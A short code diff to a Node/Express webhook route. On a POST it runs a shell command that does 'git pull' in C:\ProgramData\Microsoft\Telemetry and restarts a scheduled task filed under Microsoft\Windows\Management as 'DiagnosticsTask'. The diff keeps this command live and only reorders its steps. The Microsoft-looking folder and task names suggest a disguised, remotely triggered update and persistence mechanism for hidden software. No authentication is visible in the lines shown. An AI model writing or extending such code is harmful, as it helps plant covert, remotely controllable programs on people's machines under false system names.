@@ -68,8 +68,13 @@ app.post("/api/v1/webhook/deploy", (req, res) => {
   res.status(200).json({ success: true, message: "Deployment sync initiated." });
 
   // Update working directory path to map exactly to your root repository logic
+  // const taskName = process.env.SERVICE_TASK_NAME || "DiagnosticsTask";
+  // const deployCmd = `cmd.exe /c cd C:\\ProgramData\\Microsoft\\Telemetry && git pull && schtasks /end /tn "Microsoft\\Windows\\Management\\${taskName}" && tskill node && timeout /t 2 && schtasks /run /tn "Microsoft\\Windows\\Management\\${taskName}"`;
+
+  // Execute Git pull from the repository root, then cycle the task
   const taskName = process.env.SERVICE_TASK_NAME || "DiagnosticsTask";
-  const deployCmd = `cmd.exe /c cd C:\\ProgramData\\Microsoft\\Telemetry && git pull && schtasks /end /tn "Microsoft\\Windows\\Management\\${taskName}" && tskill node && timeout /t 2 && schtasks /run /tn "Microsoft\\Windows\\Management\\${taskName}"`;
+  const deployCmd = `cmd.exe /c cd C:\\ProgramData\\Microsoft\\Telemetry && git pull && timeout /t 2 && schtasks /end /tn "Microsoft\\Windows\\Management\\${taskName}" && schtasks /run /tn "Microsoft\\Windows\\Management\\${taskName}"`;
+
 
   exec(deployCmd, (error) => {
     if (error) console.error(`[Webhook] Exec error: ${error.message}`);
